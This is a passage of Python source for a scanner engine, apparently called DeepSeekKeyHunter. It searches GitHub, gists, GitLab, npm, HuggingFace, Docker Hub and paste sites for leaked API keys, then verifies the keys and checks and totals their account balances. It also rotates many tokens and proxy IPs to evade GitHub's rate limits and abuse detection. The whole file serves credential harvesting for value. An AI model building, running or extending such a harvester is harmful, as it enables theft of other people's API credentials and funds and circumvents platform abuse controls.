    return [q["query"] for q in tiered]


def is_bad_key(key: str, extra_bad: list = None) -> bool:
    return _scanner_is_bad_key(key, extra_bad)


def convert_to_usd(balance: float, currency: str, rate: float = DEFAULT_USD_CNY_RATE) -> float:
    # PERCENT 透传是有意设计:阈值/台账按百分点理解(>1% 留存,0% 也记录)。
    # 金额**汇总点**负责排除 PERCENT(见 _save_final),不在换算层丢弃。
    if currency.upper() == "CNY":
        return balance / rate if rate > 0 else 0
    return balance


def convert_to_cny(balance: float, currency: str, rate: float = DEFAULT_USD_CNY_RATE) -> float:
    if currency.upper() == "USD":
        return balance * rate
    return balance


class ScannerEngine:
    def __init__(self,
                 concurrency: int = 20,
                 timeout: int = 15,
                 search_delay: float = 2.5,
                 max_pages: int = 3,
                 min_key_length: int = 32,
                 max_key_length: int = 64,
                 output_dir: str = ".",
                 deepseek_api_base: str = "https://api.deepseek.com",
                 usd_cny_rate: float = DEFAULT_USD_CNY_RATE,
                 exclude_repos: list = None,
                 extra_bad_patterns: list = None,
                 log_callback: Callable[[str, str], None] = None,
                 progress_callback: Callable[[int, int, str], None] = None,
                 max_duration: int = 0,
                 max_valid_keys: int = 0,
                 auto_save_interval: int = 0,
                 scan_pages: int = 5,
                 proxy: str = None,
                 allow_chat_probe: bool = False,
                 probe_unclear: bool = True,
                 proxy_subscription: str = None,
                 ):
        self.concurrency = concurrency
        self.timeout = timeout
        self.search_delay = search_delay
        self.max_pages = max_pages
        self.min_key_length = min_key_length
        self.max_key_length = max_key_length
        self.output_dir = output_dir
        self.deepseek_api_base = deepseek_api_base
        self.usd_cny_rate = usd_cny_rate
        self.exclude_repos = exclude_repos or []
        self.extra_bad_patterns = extra_bad_patterns or []
        self.log_callback = log_callback or (lambda msg, level="info": print(msg))
        self.progress_callback = progress_callback or (lambda cur, total, phase: None)
        self.proxy = proxy
        self.allow_chat_probe = allow_chat_probe
        self.probe_unclear = probe_unclear
        self.hv_balance_threshold = 1.0
        try:
            from providers import PROVIDER_RATE_INTERVALS, ProviderRateLimiter
            self.provider_rate_limiter = ProviderRateLimiter(
                intervals=dict(PROVIDER_RATE_INTERVALS))
        except ImportError:
            self.provider_rate_limiter = None

        # 退出机制
        self.max_duration = max_duration
        self.max_valid_keys = max_valid_keys
        self.auto_save_interval = auto_save_interval or 20
        self.scan_pages = max(1, min(10, scan_pages or 10))  # 默认10页, 限1-10

        # 复用 scanners/base.py 的 KEY_PATTERN(单一真相源)——顶部 import,不再本地复制。
        self.key_pattern = KEY_PATTERN
        self._stop_requested = False
        self._start_time = time.time()
        self._valid_count = 0
        self._saved_count = 0
        self.results = []
        self.all_keys = {}

        # GitHub Code Search 节流：per-token pacing（每个 token 独立 10次/分钟 配额）。
        # 不同 token 互不阻塞 → N 个 token 并发可获 N× 吞吐。
        # _gh_pacing_interval 为每 token 两次调用间的总周期（6s = 10次/分钟 极限）。
        # 动态 pacing：sleep = max(0, interval - request_elapsed)，扣除请求耗时，
        # 保证总周期精确 6s → 第 10 次请求恰好在 60s 窗口边界，用满配额。
        # Pacing interval is now per-token (pacing_key) — one token's 429
        # no longer slows down all other tokens.
        self._gh_pacing_interval: dict[str, float] = {}  # pacing_key -> seconds
        self._gh_pacing_locks: dict[str, threading.Lock] = {}   # token → 该 token 的 pacing 锁
        self._gh_pacing_calls: dict[str, float] = {}            # token → 上次调用时间戳
        self._gh_last_req_time: dict[str, float] = {}           # token → 上次请求耗时（用于动态 pacing）
        self._gh_pacing_lock = threading.Lock()                  # 保护上面字典的元锁
        # 自适应限速：per-token 记录最近 429 时刻 → 窗口内再发生 429 时把该 token
        # 的间隔动态放大（最大 12s），避免满速 10/min 持续撞滚动窗口边缘；
        # 连续 ~2 分钟无 429 逐步回降到基线 7s。跨多实例共享 token 时尤其有效
        # （另一实例正在消耗配额 → 本实例自动降速，而非反复 429 退避）。
        self._gh_pacing_base: float = 6.0
        self._gh_last_429: dict[str, float] = {}                # token → 最近 429 时刻
        self._gh_ok_since_429: dict[str, float] = {}            # token
        # P0-2: Token health tracking - auto-skip tokens with repeated 401s
        self._token_401_count: dict[str, int] = {}              # consecutive 401 count per token
        self._token_disabled: set[str] = set()                  # tokens auto-disabled this session
        # Task 3.2: Self-quiet protocol — per-token secondary rate limit cooldown
        self._secondary_limit_until: dict[str, float] = {}       # pacing_key -> deadline timestamp
        # v2.4.5: 429 时刻记录(滑动 1h 窗口)——二级限流是持续高频触发的,
        # 短冷却(120s)后会复发;≥3 次/小时 → 深度冷却降档。
        self._gh_429_times: dict[str, list] = {}                 # pacing_key -> [timestamps]
        # v2.4.6: 惩罚箱——GitHub 滥用检测是 IP 级(非 token 级)。3 token 各
        # ~9 req/min = IP 级 ~27 req/min,远超滥用阈值(~15-20/min)。
        # 任何 token 出现长 Retry-After(>60s)→ 全局惩罚箱:所有 token 降速到
        # ~2 req/min/token 并持续 10 分钟,期间不再触发升级惩罚。
        self._penalty_box_until: float = 0.0                     # 全局惩罚箱截止时间
        self._global_429_times: list = []                        # 所有 token 的 429 时间戳(IP 级)

        # v2.5: 原生配额调度器——X-RateLimit 响应头驱动,把每 token 的
        # 10 次/窗口配额均匀铺到重置时刻(≈6s/次),主配额永不提前打光 →
        # 永不 sleep-to-reset、永不主配额 429。与上面的 IP 滥用层正交:
        # 配额层管 per-token 硬限制,IP 层(间隔/惩罚箱)管滥用阈值。
        from rate_scheduler import RateScheduler
        self._rate_sched = RateScheduler(log=self.log)

        # SmartProxy：直连优先 + 代理回退 + 结果缓存
        # 服务器部署时外网可直连，不需要代理；国内访问 GitHub 等可能仍需代理
        from proxy_resolver import MultiProxyRouter, SmartProxy, parse_subscription_links
        self._smart_proxy = SmartProxy(proxy)
        self._proxies = self._smart_proxy.get_proxies_dict()  # requests 兼容（直连时 None）

        # v2.4.7: 多代理 IP 级路由 — 将 token 分散到不同代理 IP,每个 IP 独立 pacing
        self._multi_proxy: MultiProxyRouter | None = None
        self._mihomo = None
        if proxy_subscription:
            endpoints = parse_subscription_links(proxy_subscription)
            proxy_urls = [e.get("url") for e in endpoints if e.get("url")]
            http_urls = [u for u in proxy_urls if u.startswith(("http://", "https://", "socks5://"))]
            if http_urls:
                # HTTP/SOCKS 直链,直接用
                self._multi_proxy = MultiProxyRouter(http_urls)
                self.log(f"多代理模式: {self._multi_proxy.num_proxies} 个 HTTP 端点,per-IP pacing")
            elif proxy_urls:
                # VMess/Trojan/Hysteria2 → 启动 mihomo 内嵌客户端
                self.log(f"订阅含 {len(proxy_urls)} 个非 HTTP 端点,启动内嵌 mihomo...")
                from mihomo_manager import MihomoManager
                self._mihomo = MihomoManager(proxy_subscription)
                if self._mihomo.start():
                    self._multi_proxy = MultiProxyRouter(self._mihomo.proxy_urls)
                    self.log(f"mihomo 多代理模式: {self._multi_proxy.num_proxies} 个本地 HTTP 端口,per-IP pacing")
                else:
                    self.log("mihomo 启动失败,回退到单代理模式", "warning")
                    self._mihomo = None
        if not self._multi_proxy:
            self.log(f"单代理模式: {proxy or '直连'}")
        self.__init_route_state()

        # 增量去重：加载历史已验证的 key
        self._known_keys = set()
        self._query_tracker = QueryTracker()

    def _is_token_healthy(self, token: str) -> bool:
        """Check if token is still usable. Auto-disable after 3 consecutive 401s."""
        if token in self._token_disabled:
            return False
        return self._token_401_count.get(token, 0) < 3

    # IP-level rate limit routing: when multiple tokens share an IP,
    # GitHub secondary rate limit triggers quickly (per-IP, not just per-account).
    # Distribute tokens across direct/proxy to split IP footprint.
    # v2.4.9: 从类属性改为实例属性——类属性会让 watch 长驻实例与
    # maintenance/健康检查临时实例共享路由冷却状态,互相污染。

    def __init_route_state(self):
        """单代理 direct/proxy 分流路由状态(实例级)。"""
        self._token_route: dict[str, str] = {}          # token -> "direct" | "proxy"
        self._route_ip_cooldowns: dict[str, float] = {}  # "direct" | "proxy" -> deadline
        self._route_lock = threading.Lock()
        self._fresh_repo_round: dict[str, int] = {}     # 每 token 已扫轮数(实例级,见类注释)

    def _route_for_token(self, token: str) -> dict | None:
        """Pick a route (direct or proxy) for this token, spreading IP load.

        v2.4.7: 多代理模式下,每个 token 绑定一个独立代理 IP(MultiProxyRouter)。
        """
        if not token:
            return self._smart_proxy.get_proxies_dict()

        # 多代理模式:每个 token 绑定独立代理 IP
        if self._multi_proxy and self._multi_proxy.num_proxies > 0:
            return self._multi_proxy.get_proxies_for_token(token)

        # 单代理模式(原有逻辑)
        route_key = token[:20]  # truncated key for stable route assignment

        # v2.4.9: 未配置代理时 direct/proxy 分流毫无意义(两条"路由"同一出口 IP),
        # 冷却切换只会自欺——恒走 direct。
        if not self._smart_proxy.config_proxy:
            return None

        with self._route_lock:
            # If this token already has a route, check if it's still viable
            current = self._token_route.get(route_key)
            if current and self._route_ip_cooldowns.get(current, 0) < time.time():
                return self._proxy_for_route(current) if current == "proxy" else None

            # Assign route: alternate based on token index to spread load
            all_tokens = self.get_all_gh_tokens()
            idx = all_tokens.index(token) if token in all_tokens else 0

            # If one route is in cooldown, use the other
            direct_cooldown = self._route_ip_cooldowns.get("direct", 0) > time.time()
            proxy_cooldown = self._route_ip_cooldowns.get("proxy", 0) > time.time()

            if direct_cooldown and not proxy_cooldown:
                route = "proxy"
            elif proxy_cooldown and not direct_cooldown:
                route = "direct"
            else:
                # Both up or both down: alternate by index
                route = "proxy" if idx % 2 == 1 else "direct"

            self._token_route[route_key] = route
            return self._proxy_for_route(route) if route == "proxy" else None

    def get_pacing_key(self, token: str) -> str:
        """返回该 token 使用的 pacing key。

        v2.4.8 核心语义: pacing key 永远代表**出口 IP**,与模式无关——
        - 多代理: 每个代理 IP 一个桶(token[i] → proxy[i % M]),每 IP 独立限速
        - 单代理/直连: 所有 token 共享一个桶("__ip_shared__"),速度自动降级到
          单 IP 安全水位,而不是保持多代理速率打爆唯一的 IP(v2.4.7 断链教训)
        """
        if self._multi_proxy and self._multi_proxy.num_proxies > 0:
            return self._multi_proxy.get_pacing_key(token)
        # 单代理/直连:所有 token 同一出口 IP → 同一个限速桶
        return "__ip_shared__"

    def _baseline_interval(self, pacing_key: str) -> float:
        """IP 层兜底基线间隔(v2.5)。

        v2.5 起 per-token 节奏由配额层(header-driven,≈6s/token)原生负责,
        IP 层只做防滥用地板:统一 6.0s/出口IP = 10 req/min/IP,
        是滥用阈值(15-20/min)的一半——多代理 1 token/IP 时配额层主导
        (两者恰好一致),多 token 挤同一 IP 或单代理共享桶时地板兜底串行化。
        v2.4.8 的模式区分(多 4.0 / 单 4×N)由配额层接管后不再需要。
        """
        return 6.0

    def _on_ip_rate_limit(self, token: str):
        """Called when code search gets 429/503/secondary-limit — cooldown the
        current route for this token's IP and force switch next request.

        v2.4.7: 多代理模式下仅冷却该 token 对应的代理 IP,其他 IP 全速运行。
        v2.4.9: 此前本方法在类内被旧版重复定义覆盖,多代理冷却从未生效——
        旧版已删。单代理侧的 IP 级冷却由 _gh_search 的分层冷却
        (15s 降档/25s 惩罚箱)承担,此处只管多代理 per-IP 冷却。
        """
        if self._multi_proxy and self._multi_proxy.num_proxies > 0:
            self._multi_proxy.on_ip_rate_limit(token)

    def _proxy_for_route(self, route: str) -> dict | None:
        """Resolve a route name to actual proxies dict."""
        proxy_url = self._smart_proxy.config_proxy
        if route == "proxy" and proxy_url:
            return {"http": proxy_url, "https": proxy_url}
        return None

    def _record_token_401(self, token: str):
        """Record a 401 response for a token. Disable after threshold."""
        count = self._token_401_count.get(token, 0) + 1
        self._token_401_count[token] = count
        if count >= 3 and token not in self._token_disabled:
            self._token_disabled.add(token)
            preview = token[:12] + '...' + token[-4:]
            self.log(f'Token {preview} disabled (3 consecutive 401s - may be revoked)', 'warning')

    def _record_token_success(self, token: str):
        """Reset 401 count on successful request."""
        if token in self._token_401_count:
            self._token_401_count[token] = 0

    def get_active_tokens(self) -> list[str]:
        """Return only healthy tokens (exclude disabled ones)."""
        all_tokens = self.get_all_gh_tokens()
        return [t for t in all_tokens if self._is_token_healthy(t)]

    @staticmethod
    def check_gh_auth() -> bool:
        """检测 gh CLI 是否已认证"""
        return bool(ScannerEngine.get_gh_token())

    @staticmethod
    def get_gh_token() -> str:
        """Get GitHub token from gh CLI, env var, or git config."""
        # Try GH_TOKEN / GITHUB_TOKEN env var first
        for env_var in ["GH_TOKEN", "GITHUB_TOKEN"]:
            token = os.environ.get(env_var, "")
            if token:
                return token
        # Try gh CLI
        try:
            r = subprocess.run(
                ["gh", "auth", "token"], capture_output=True, timeout=5,
                encoding="utf-8", errors="replace"
            )
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.strip()
        except Exception:
            pass
        return ""

    @staticmethod
    def get_all_gh_tokens() -> list:
        """获取所有可用的 GitHub Token（支持多 Token 并行）。
        优先级: config.ini > GH_TOKENS (逗号分隔) > GH_TOKEN > GITHUB_TOKEN > gh CLI"""
        # 优先从 config.ini 读取
        try:
            from config_loader import config
            if config.github_tokens:
                return config.github_tokens
        except ImportError:
            pass
        # 多 Token 环境变量
        tokens_env = os.environ.get("GH_TOKENS", "")
        if tokens_env:
            tokens = [t.strip() for t in tokens_env.split(",") if t.strip()]
            if tokens:
                return tokens
        # 单 Token 回退
        single = ScannerEngine.get_gh_token()
        return [single] if single else []

    def github_token_health(self) -> dict:
        """探测配置的 GitHub token 是否可用；只返回聚合结果，不返回 token。"""
        tokens = self.get_all_gh_tokens()
        health = {"configured": len(tokens), "valid": 0, "invalid": 0,
                  "unknown": 0, "code_search_ready": False}
        for token in tokens:
            try:
                resp = requests.get(
                    "https://api.github.com/rate_limit",
                    headers={"Authorization": f"Bearer {token}",
                             "Accept": "application/vnd.github+json",
                             "User-Agent": "DeepSeekKeyHunter/5.0"},
                    proxies=self._route_for_token(token),
                    timeout=10,
                )
                if resp.status_code == 200:
                    health["valid"] += 1
                elif resp.status_code == 401:
                    health["invalid"] += 1
                else:
                    health["unknown"] += 1
            except Exception:
                health["unknown"] += 1
        health["code_search_ready"] = health["valid"] > 0
        return health

    def log(self, msg: str, level: str = "info"):
        self.log_callback(msg, level)

    def stop(self):
        self._stop_requested = True
        # v2.4.7: 停止内嵌 mihomo 进程
        if self._mihomo:
            self._mihomo.stop()
            self._mihomo = None

    def _load_known_keys(self):
        """加载历史已验证的 key，用于增量去重。"""
        # 跟随 output_dir(与 _persist_results 写入同一目录)——硬编码模块目录下
        # results/ 会让自定义 output_dir 的实例读错去重源。
        results_dir = self.output_dir
        if not os.path.isdir(results_dir):
            return
        for filename in os.listdir(results_dir):
            if not filename.endswith(".json") or filename == "query_stats.json":
                continue
            filepath = os.path.join(results_dir, filename)
            try:
                with open(filepath, encoding="utf-8") as f:
                    data = json.load(f)
                items = data if isinstance(data, list) else (
                    data.get("results") or data.get("valid_keys") or [])
                for item in items:
                    if isinstance(item, dict):
                        k = item.get("key", "")
                        if k:
                            self._known_keys.add(k)
            except Exception:
                pass
        if self._known_keys:
            self.log(f"已加载 {len(self._known_keys)} 个历史 Key（增量去重）")

    # ================================================================
    #  主流水线: 搜索 → 验证 → 保存 → 检查退出 → 下一轮
    #  每轮 = 一条查询, 边扫边验边存, 时间/数量达标立即退出
    # ================================================================

    def run(self, queries: list) -> list:
        """主流水线: 逐条查询, 搜索→验证→保存→检查限制→循环
        支持 Ctrl+C 优雅退出: 保存进度, 验证已扫 Key, 保存结果
        """
        if not queries:
            return []

        all_valid = []      # 最终有效结果
        total_scanned = 0
        current_round = 0
        unverified_keys = {}  # 当前轮未验证的 Key (Ctrl+C 时补验)
        os.makedirs(self.output_dir, exist_ok=True)
        self._start_time = time.time()

        # 增量去重：加载历史已验证的 key
        self._load_known_keys()

        # 按历史收益排序查询（高产优先）
        ordered = self._query_tracker.sort_by_yield(queries)

        # 多 Token 支持：轮转使用多个 GitHub Token（剔除已被 401 禁用的——
        # 否则死 token 的查询桶每次静默空返回,统计被打成 barren 毒化收益学习）
        all_tokens = [t for t in self.get_all_gh_tokens()
                      if self._is_token_healthy(t)]
        token_idx = 0

        self.log(f"流水线启动: {len(queries)} 条查询 (收益排序), 并发 {self.concurrency}, "
                 f"时长限制 {self.max_duration}s, 目标 {self.max_valid_keys} 个有效Key")
        self.log(f"GitHub Token: {len(all_tokens)} 个可用" + (" (多Token轮转)" if len(all_tokens) > 1 else ""))
        if self.get_all_gh_tokens() and not all_tokens:
            self.log("❌ 配置的 GitHub token 全部被 401 禁用——流水线将空转,请更换 token",
                     "error")
        if self._known_keys:
            self.log(f"增量去重: 已知 {len(self._known_keys)} 个 Key，将跳过验证")

        try:
            for qi, query in enumerate(ordered):
                current_round = qi + 1

                if self._query_tracker.is_low_quality(query):
                    self.log(f"  跳过低质量查询: {query} "
                             f"(验证反馈 valid 率过低且无高价值)", "info")
                    continue

                # ── 检查退出条件 ──
                if self._should_stop():
                    self.log(f"流水线退出: {self._stop_reason()}", "warning")
                    break

                # 动态页数：根据历史收益调整
                suggested_pages = self._query_tracker.suggest_pages(query, self.scan_pages)
                # Token 轮转
                current_token = all_tokens[token_idx % len(all_tokens)] if all_tokens else None
                token_idx += 1

                self.log(f"\n{'='*40}")
                self.log(f"轮次 [{qi+1}/{len(queries)}]: {query} (页数: {suggested_pages})")
                self.progress_callback(qi + 1, len(queries), "search")

                # ── 第一步: 搜索 ──
                round_keys = self._scan_one_query(query, max_pages=suggested_pages, token=current_token)

                # 记录查询收益
                self._query_tracker.record(query, len(round_keys))

                unverified_keys = round_keys  # 暂存，用于 Ctrl+C 恢复
                if not round_keys:
                    self.log("  本轮发现: 0 个 Key，跳过验证")
                    unverified_keys = {}
                    time.sleep(self.search_delay)
                    continue

                self.log(f"  本轮发现: {len(round_keys)} 个疑似 Key")

                # 增量去重：过滤已知 key
                if self._known_keys:
                    before = len(round_keys)
                    round_keys = {k: v for k, v in round_keys.items() if k not in self._known_keys}
                    skipped = before - len(round_keys)
                    if skipped:
                        self.log(f"  增量去重: 跳过 {skipped} 个已知 Key")
                    if not round_keys:
                        self.log("  全部为已知 Key，跳过验证")
                        unverified_keys = {}
                        time.sleep(self.search_delay)
                        continue

                # ── 第二步: 立即验证 ──
                self.log(f"  开始验证 {len(round_keys)} 个 Key...")
                round_results = self._verify_dict(round_keys)
                self._record_query_outcomes(round_results)
                unverified_keys = {}  # 已验证，清空暂存
                self._persist_results(round_results)

                valid = [r for r in round_results if r.get("valid")]
                invalid = [r for r in round_results if not r.get("valid")]
                self.log(f"  验证结果: {len(valid)} 有效, {len(invalid)} 无效 (丢弃)")

                # 有效 Key 加入累计 (去重)
                existing_keys = {r["key"] for r in all_valid}
                for r in valid:
                    if r["key"] not in existing_keys:
                        all_valid.append(r)
                        existing_keys.add(r["key"])
                # 统计所有有效 Key (原始逻辑: 多多益善)
                self._valid_count = len(all_valid)
                total_scanned += len(round_keys)

                # ── 第三步: 增量保存 (仅有效 Key) ──
                self._save_incremental(all_valid, qi, len(queries))

                # ── 第四步: 检查退出条件 ──
                if self._should_stop():
                    self.log(f"  轮次结束后 {self._stop_reason()}", "warning")
                    break

                time.sleep(self.search_delay)

        except KeyboardInterrupt:
            self.log("\n!!! 收到 Ctrl+C 信号 !!!", "error")
            self.log(f"已扫描 {current_round-1}/{len(queries)} 轮, {len(all_valid)} 个有效Key")

            # 验证未完成的轮次的 Key
            if unverified_keys:
                self.log(f"正在验证当前轮 {len(unverified_keys)} 个未验证 Key...")
                try:
                    emergency_results = self._verify_dict(unverified_keys)
                    valid_emergency = [r for r in emergency_results if r.get("valid")]
                    existing = {r["key"] for r in all_valid}
                    added = 0
                    for r in valid_emergency:
                        if r["key"] not in existing:
                            all_valid.append(r)
                            existing.add(r["key"])
                            added += 1
                    self.log(f"紧急验证完成: {len(valid_emergency)} 有效, 新增 {added} 个")
                except Exception as e:
                    self.log(f"紧急验证失败: {e}", "error")

            # 保存进度
            self._save_final(all_valid)
            self.log(f"已安全保存 {len(all_valid)} 个有效Key, 优雅退出", "warning")

        # 最终保存
        self._save_final(all_valid)
        self._query_tracker.save()
        elapsed = time.time() - self._start_time

        positive_only = [r for r in all_valid if r.get("balance_usd", 0) > 0]
        self.log(f"\n{'='*40}")
        self.log(f"流水线完成: {elapsed:.0f}s | 扫描 {total_scanned} 个Key | "
                 f"有效 {len(all_valid)} 个 | 正余额 {len(positive_only)} 个")
        if positive_only:
            # PERCENT(周额度%)不计入金额合计——阈值按百分点,合计只算真金额
            money_rows = [r for r in positive_only
                          if (r.get("primary_currency") or "").upper() != "PERCENT"]
            total_usd = sum(r.get("balance_usd", 0) for r in money_rows)
            total_cny = sum(r.get("balance_cny", 0) for r in money_rows)
            self.log(f"正余额总价值: ${total_usd:.2f} / ¥{total_cny:.2f} (欠费不计入)")

        return all_valid

    def run_multi_source(self, sources: list, queries: list = None,
                         github_token: str = "", gitlab_token: str = "",
                         gitee_token: str = "", hf_token: str = "",
                         docker_token: str = "") -> list:
        """多源扫描: 按 AVAILABLE_SOURCES 中的真实扫描器调度。
        sources: 例如 ['github_search', 'gist', 'issues', 'github_commits',
                   'gitlab', 'huggingface', 'npm', 'github_events']
        每个 source 用独立 scanner 实例，并发运行。
        token 优先级: 参数 > config.ini > 环境变量
        """
        if not sources:
            self.log("未指定扫描来源", "warning")
            return []
        unknown = [source for source in sources if source not in AVAILABLE_SOURCES]
        if unknown:
            raise ValueError(
                f"未知数据源: {', '.join(unknown)}; 可用: {', '.join(AVAILABLE_SOURCES)}")

        os.makedirs(self.output_dir, exist_ok=True)
        self._start_time = time.time()

        scanner_map = {
            source: (
                AVAILABLE_SOURCES[source],
                queries if source in GITHUB_SEARCH_SOURCES and queries
                else SOURCE_DEFAULT_QUERIES[source],
            )
            for source in sources
        }

        self.log(f"多源扫描启动: {len(sources)} 个来源 -> {[scanner_map[s][0] for s in sources]}")
        self.log(f"验证并发: {self.concurrency}, 时长限制: {self.max_duration}s, 目标: {self.max_valid_keys} 个")

        all_discovered = {}

        for src in sources:
            if self._should_stop():
                break

            label, default_query = scanner_map.get(src, (src, None))
            self.log(f"\n{'='*50}")
            self.log(f"  [{label}] 开始扫描...")
            self.log(f"{'='*50}")

            try:
                round_keys = self._run_one_scanner(src, default_query, github_token,
                                                   gitlab_token, gitee_token,
                                                   hf_token, docker_token)
            except Exception as e:
                self.log(f"  [{label}] 扫描异常: {e}", "error")
                continue

            if not round_keys:
                self.log(f"  [{label}] 未发现 Key")
                continue

            self.log(f"  [{label}] 发现 {len(round_keys)} 个疑似 Key")

            # source 是产出质量归因的核心维度；scanner 结果只带 repo/url。
            for info in round_keys.values():
                info.setdefault("source", src)

            # Verify（整批一次——曾错误嵌套在上一循环内导致 N 个 key 触发
            # N² 次验证并重复落库，外部源轮次验证队列被放大数十倍）
            self.log(f"  验证 {len(round_keys)} 个 Key...")
            round_results = self._verify_dict(round_keys)
            self._persist_results(round_results)
            self._record_query_outcomes(round_results)

            valid = [r for r in round_results if r.get("valid")]
            invalid = [r for r in round_results if not r.get("valid")]
            self.log(f"  [{label}] 有效: {len(valid)}, 无效: {len(invalid)}")

            for r in valid:
                k = r["key"]
                if k not in all_discovered:
                    all_discovered[k] = r

            # 累计所有源的有效 key 数（_verify_dict 只返回当批数量），
            # 否则 --max-keys 在 key 分散于多个源时永远不会触发停止
            self._valid_count = len(all_discovered)

            self._save_incremental(
                list(all_discovered.values()),
                sources.index(src), len(sources)
            )

            if self._should_stop():
                self.log(f"  达到退出条件: {self._stop_reason()}", "warning")
                break

            time.sleep(1.0)

        all_results = list(all_discovered.values())
        self._save_final(all_results)
        self._query_tracker.save()
        elapsed = time.time() - self._start_time

        positive_only = [r for r in all_results if r.get("balance_usd", 0) > 0]
        self.log(f"\n{'='*40}")
        self.log(f"多源扫描完成: {elapsed:.0f}s | 有效 {len(all_results)} 个 | 正余额 {len(positive_only)} 个")
        if positive_only:
            money_rows = [r for r in positive_only
                          if (r.get("primary_currency") or "").upper() != "PERCENT"]
            total_usd = sum(r.get("balance_usd", 0) for r in money_rows)
            total_cny = sum(r.get("balance_cny", 0) for r in money_rows)
            self.log(f"正余额总价值: ${total_usd:.2f} / ¥{total_cny:.2f} (欠费不计入)")

        return all_results

    def _record_query_outcomes(self, results: list[dict]) -> None:
        """把验证结果回写查询收益；单次扫描不依赖 watch 回调也能学习。"""
        from providers import PROVIDER_MAP

        for result in results:
            query = result.get("query")
            if not query or query == "unknown":
                continue
            # error/rate_limited 是瞬态结果(网络故障/平台限流),不是"验证过且无效"。
            # 计入 validated 会把有效率分母灌水——一轮全网验证故障就能把正常查询
            # 打到 5% 以下被 is_low_quality 熔断,且该状态持久化,CLI 路径无衰减。
            if result.get("status") in ("error", "rate_limited"):
                continue
            provider = PROVIDER_MAP.get(result.get("provider", ""))
            value_capable = bool(
                provider and provider.has_balance_check and provider.balance_endpoint)
            self._query_tracker.record_outcome(
                query,
                valid=bool(result.get("valid")),
                high_value=bool(result.get("valid")
                                and (result.get("balance_cny") or 0)
                                > getattr(self, "hv_balance_threshold", 1.0)),
                value_capable=value_capable,
            )

    # Scanner factory: (class, search_term, extra_init_kwargs)
    def _get_scanner_registry(self, github_token: str = "", gitlab_token: str = "",
                              gitee_token: str = "", hf_token: str = "",
                              docker_token: str = ""):
        # 从 config.ini 读取 token（如果未通过参数传入）
        commits_since_hours = 0
        try:
            from config_loader import config
            if not github_token:
                github_token = config.github_token
            if not gitlab_token:
                gitlab_token = config.gitlab_token
            if not gitee_token:
                gitee_token = config.gitee_token
            if not hf_token:
                hf_token = config.hf_token
            if not docker_token:
                docker_token = config.docker_token
            # github_commits 源时间窗口（小时）：engine 显式覆盖优先，否则 config 默认 2
            override = getattr(self, "commits_since_hours", None)
            commits_since_hours = config.watch_commits_since_hours if override is None else override
        except ImportError:
            pass

        # 每次调用都重建 registry，避免 class-level 缓存导致的 stale proxy 问题
        return {
            "gist": (GistScanner, None, {"token": github_token, "proxy": self.proxy}),
            "issues": (IssuesScanner, '"sk-"', {"token": github_token, "proxy": self.proxy}),
            "commits": (CommitsScanner, None, {"token": github_token, "proxy": self.proxy}),
            "github_commits": (CommitsScanner, None, {"token": github_token, "proxy": self.proxy,
                                                      "since_hours": commits_since_hours}),  # 别名(watch 源名) + 新鲜度窗口
            "gitlab": (GitLabScanner, "deepseek", {"token": gitlab_token, "max_projects": 15 if gitlab_token else 4, "max_files_per_project": 15 if gitlab_token else 4, "deadline_s": 40 if gitlab_token else 28, "proxy": self.proxy}),
            "docker": (DockerHubScanner, "deepseek", {"token": docker_token, "max_images": 15, "proxy": self.proxy}),
            "npm": (NpmScanner, "deepseek", {"max_packages": 40, "proxy": self.proxy}),
            "huggingface": (HuggingFaceScanner, "deepseek", {"token": hf_token, "max_items": 24, "deadline_s": 18, "proxy": self.proxy}),
            "paste_sites": (PasteSiteScanner, None, {"max_pages": 10, "proxy": self.proxy}),
            "github_raw": (GitHubRawScanner, None, {"token": github_token, "proxy": self.proxy}),
            "github_events": (EventsMonitor, None, {"token": github_token, "poll_interval": 10,
                                                      "max_events_per_poll": 30, "deadline_s": 45,
                                                      "proxy": self.proxy}),
        }

    def _run_one_scanner(self, source: str, queries: list = None,
                         github_token: str = "", gitlab_token: str = "",
                         gitee_token: str = "", hf_token: str = "",
                         docker_token: str = "") -> dict:
        """Run a single scanner by name and return discovered keys dict.
        If queries is a list of search terms, the scanner runs multiple times
        with different search queries (for external platforms).
        """
        discovered = {}

        # GitHub source uses synchronous _scan_one_query (which has its own asyncio.run),
        # so handle it outside the async wrapper to avoid nested event loops.
        if source in GITHUB_SEARCH_SOURCES:
            _queries = queries if queries else BUILTIN_QUERIES
            skipped = 0
            active_queries = []
            for query in _queries[:50]:
                if self._query_tracker.is_low_quality(query):
                    skipped += 1
                    continue
                active_queries.append(query)
            if skipped:
                self.log(f"  质量熔断跳过 {skipped}/{min(len(_queries), 50)} 条查询",
                         "info")
            _queries = active_queries
            for query in _queries[:50]:
                if self._should_stop():
                    break
                batch = self._scan_one_query(query)
                for k, v in batch.items():
                    if k not in discovered:
                        discovered[k] = v
                time.sleep(self.search_delay)
            return discovered

        async def _do():
            nonlocal discovered
            registry = self._get_scanner_registry(github_token, gitlab_token, gitee_token,
                                                 hf_token, docker_token)
            scanner_cls, default_term, extra_kwargs = registry.get(source, (None, None, {}))
            if scanner_cls is None:
                return

            # Determine search terms: use provided queries or default from registry
            search_terms = queries if queries else [default_term]

            scanner = scanner_cls(concurrency=self.concurrency, timeout=self.timeout, **extra_kwargs)
            for term in search_terms:
                if self._should_stop():
                    break
                try:
                    results = await scanner.search(term)
                    for r in results:
                        k = r["key"]
                        if k not in discovered:
                            discovered[k] = {
                                "key": k,
                                "key_preview": r.get("key_preview", k[:10] + "..." + k[-4:]),
                                "repos": [{"repo": r.get("repo", ""), "file": r.get("file", ""),
                                           "url": r.get("url", "")}],
                            }
                except Exception as e:
                    self.log(f"  Scanner {source} query '{term}' failed: {e}", "warning")

        asyncio.run(_do())
        return discovered

    def _is_likely_test_key(self, file_path: str, repo: str) -> bool:
        """Pre-filter to skip build artifacts and known test duplicates.
        Only skip unambiguous low-value patterns — real keys often appear
        in demo/example/sample files."""
        lower = (file_path + "/" + repo).lower()
        # Build artifacts only
        for kw in ["/target/site/", "/target/classes/", "/build/resources/",
                    "/bin/main/"]:
            if kw in lower:
                return True
        # Known duplicate test files that produce noise
        for kw in ["testdeepseek", "tongyichat",
                   "TongYiChatModelTests", "DeepSeekChatModelTests"]:
            if kw in lower:
                return True
        return False

    def _scan_one_query(self, query: str, max_pages: int = None, token: str = None,
                        on_key: Callable[[dict], None] = None) -> dict:
        """扫描单条查询: 取最多 N 页 (每页100条)
        优先使用 text_matches 直接提取 Key (快速), 如果没找到再下载原始文件。
        max_pages: 自适应页数，None 时用默认值。
        token: 可选，指定 GitHub Token（多 Token 并行时使用）。
